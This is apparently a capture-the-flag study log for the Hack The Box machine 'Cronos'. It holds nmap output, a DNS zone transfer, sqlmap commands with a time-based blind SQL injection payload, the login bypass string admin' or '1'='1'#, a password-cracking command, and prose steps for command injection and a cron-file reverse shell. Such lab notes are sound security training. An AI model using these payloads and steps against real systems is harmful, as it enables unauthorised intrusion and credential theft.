# Enumerate
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-22 08:00 EDT
Nmap scan report for 10.10.10.13
Host is up (0.026s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.71 seconds

* Exploits for those:
22 - probably not, but started hydra anyway with www-data user
53 - maybe privesc
	[X] the buffer overflow c file (19111/2) didn't seem to work. Definitely wrong kernel version. 
80 - doesn't look like it

* Web pages
web page is the default ubuntu page
dirbuster 

* Scan more
every port found nothing new

* DNS Recon
dnsrecon tool doesn't seem to get a response from server, reset? 
I can use nslookup to that ns and get responses
Seems like the dnsrecon should be getting responses, and I can't reset the server because it says it's under maintenance. That's probably the right way though. Try later. 
Host command worked for zone transfer.
'''
pat@kali:~/Desktop/Cert_Prep/htb/Linux/Cronos/exploits$ host -l 10.10.10.13 10.10.10.13
Using domain server:
Name: 10.10.10.13
Address: 10.10.10.13#53
Aliases: 
13.10.10.10.in-addr.arpa domain name pointer ns1.cronos.htb.
pat@kali:~/Desktop/Cert_Prep/htb/Linux/Cronos/exploits$ host -l cronos.htb 10.10.10.13
Using domain server:
Name: 10.10.10.13
Address: 10.10.10.13#53
Aliases: 
cronos.htb name server ns1.cronos.htb.
cronos.htb has address 10.10.10.13
admin.cronos.htb has address 10.10.10.13
ns1.cronos.htb has address 10.10.10.13
www.cronos.htb has address 10.10.10.13
'''


# Access
If I set my dns to use 10.10.10.13 I can then go to admin.cronos.htb and get a different web page. No idea if this is what the goal is but given that it's an http page, probably.   
Intercept with burp and run sqlmap   
```
pat@kali:~/Desktop/Cert_Prep/htb/Linux/Cronos/exploits$ sqlmap -r burp_intercept.txt --dbms=mysql --dump
...
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=a' AND (SELECT 7121 FROM (SELECT(SLEEP(5)))aNcV) AND 'bpvH'='bpvH&password=a
---
```
Not user how the time based blind works but doesn't look like something I can do without the tool?   
That took forever but quickly showed that there's admin db with users table with username and password columns.   
```
pat@kali:~/Desktop/Cert_Prep/htb/Linux/Cronos/exploits$ sqlmap -r burp_intercept.txt --dbms=mysql -D admin -T users -C username,password
```
For some reason this didn't give any results. Back to --dump I guess. 
Eventually dumps PW
```
+------+----------+----------------------------------+
| id   | username | password                         |
+------+----------+----------------------------------+
| 1    | admin    | $ADMINHASH                       |
+------+----------+----------------------------------+
```
Crack with John
```
/sbin/john -w /usr/share/wordlists/rockyou.txt ../hashes.txt --format=Raw-MD5
```

Got a hash that didn't work on the admin page or on ssh...    
	tried all combos of root/admin/www-data with that reverse hash and the hash itself   
lol wtf I looked up the md5 reverse and it totally wasn't right what John told me. John.pot file shows that was a different hash, no idea what happened.    
No idea what to do with this now.    
dirb on admin page     
* empty config.php      
* nothing else useful    
GDI if I go to www.cronos.htb, there's a totally different page to view.  
dirb on www page  
* /js/ page is index with app.js  
   
That web page is running laravel, any exploits?  
* none that worked. Tried the msf one and the python ones.   

Well I'm confused. Time to look at a writeup.  
WOW, apparently I can just sqli directly through that admin login page.  
* admin' or '1'='1'# in both fields
* found the payloadallthethingsrepo. Ading to my tools folder. 

Have the net tool page.  
Vulnerable to command injection. Get a shell.  
Read user Noulis txt file.  

# Escalate
linpeas  
* db password line?  define('DB_PASSWORD', '<>');
* also has lines about localhost 3306 homestead database  
```
/var/www/laravel/.env:APP_NAME=Laravel                                                                                                                                                                           
/var/www/laravel/.env:DB_CONNECTION=mysql
/var/www/laravel/.env:DB_DATABASE=homestead
/var/www/laravel/.env:DB_HOST=127.0.0.1
/var/www/laravel/.env:DB_PORT=3306
/var/www/laravel/.env:DB_USERNAME=homestead
```  
Can't use that for anything I guess. Wouldn't let me connect locally.  
See that cat /etc/crontab shows an application being run.  
Add a reverse shell to it and replace that file and get shell.  


# Tags
* sqlmap
* dns
* zone transfer
* sql injection, sqli


# Lessons
Try some sqli you moron.  
Even if I solve something, it's probably worth reading the writeups to see if other peoples TTPs that I might want to be aware of.  
